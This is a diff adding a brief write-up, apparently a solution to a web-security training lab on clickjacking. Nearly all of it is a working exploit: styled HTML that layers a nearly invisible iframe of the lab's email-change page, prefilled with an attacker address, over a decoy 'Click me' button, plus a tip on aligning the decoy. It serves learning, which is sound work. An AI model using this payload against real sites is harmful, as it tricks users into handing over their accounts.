@@ -1,0 +1,23 @@
+Clickjacking with form input data prefilled from a URL parameter
+
+Exploit used:
+
+<style>
+   iframe {
+       position:relative;
+       width:700;
+       height: 500;
+       opacity: 0.001;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:472;
+       left:80;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe src="https://ac751fc31f0dab8580a906f400da00ba.web-security-academy.net/email?email=hacker@attacker-website.com"></iframe>
+
+Remember to tweak the top element until it lines up properly.
